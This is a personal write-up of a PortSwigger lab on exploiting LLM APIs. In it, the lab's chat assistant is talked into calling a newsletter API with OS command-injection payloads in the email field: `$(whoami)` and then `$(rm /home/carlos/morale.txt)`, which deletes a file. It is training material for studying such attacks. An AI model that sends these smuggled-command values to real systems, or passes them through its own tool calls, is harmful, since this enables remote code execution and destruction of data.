---
{"dg-publish":true,"permalink":"/cybersecurity/pentesting/d28-01-apr/llm/lab-exploiting-vulnerabilities-in-llm-ap-is/"}
---

Date : 01 Apr 2025

---

[Access the lab](https://portswigger.net/web-security/llm-attacks/lab-exploiting-vulnerabilities-in-llm-apis)

1. From the lab homepage, click **Live chat**.
2. Ask the LLM what APIs it has access to. The LLM responds that it can access APIs controlling the following functions:
    
    - Password Reset
    - Newsletter Subscription
    - Product Information
![attachments/Pasted image 20250403122845.png](/img/user/Cybersecurity/Pentesting/D28_01%20Apr/LLM/attachments/Pasted%20image%2020250403122845.png)

3. Consider the following points:
    
    - You will probably need remote code execution to delete Carlos' `morale.txt` file. APIs that send emails sometimes use operating system commands that offer a pathway to RCE.
    - You don't have an account so testing the password reset will be tricky. The Newsletter Subscription API is a better initial testing target.
4. Ask the LLM what arguments the Newsletter Subscription API takes.
![attachments/Pasted image 20250403122944.png](/img/user/Cybersecurity/Pentesting/D28_01%20Apr/LLM/attachments/Pasted%20image%2020250403122944.png)

5. Ask the LLM to call the Newsletter Subscription API with the argument `attacker@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.
![attachments/Pasted image 20250403123103.png](/img/user/Cybersecurity/Pentesting/D28_01%20Apr/LLM/attachments/Pasted%20image%2020250403123103.png)

6. Click **Email client** and observe that a subscription confirmation has been sent to the email address as requested. This proves that you can use the LLM to interact with the Newsletter Subscription API directly.
![attachments/Pasted image 20250403152847.png](/img/user/Cybersecurity/Pentesting/D28_01%20Apr/LLM/attachments/Pasted%20image%2020250403152847.png)    
7. Ask the LLM to call the Newsletter Subscription API with the argument `$(whoami)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`.
![attachments/Pasted image 20250403152925.png](/img/user/Cybersecurity/Pentesting/D28_01%20Apr/LLM/attachments/Pasted%20image%2020250403152925.png)
   
8. Click **Email client** and observe that the resulting email was sent to `carlos@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`. This suggests that the `whoami` command was executed successfully, indicating that remote code execution is possible.
![attachments/Pasted image 20250403152958.png](/img/user/Cybersecurity/Pentesting/D28_01%20Apr/LLM/attachments/Pasted%20image%2020250403152958.png)
    
9. Ask the LLM to call the Newsletter Subscription API with the argument `$(rm /home/carlos/morale.txt)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net`. The resulting API call causes the system to delete Carlos' `morale.txt` file, solving the lab.
![attachments/Pasted image 20250403153439.png](/img/user/Cybersecurity/Pentesting/D28_01%20Apr/LLM/attachments/Pasted%20image%2020250403153439.png)

### Lab Done!

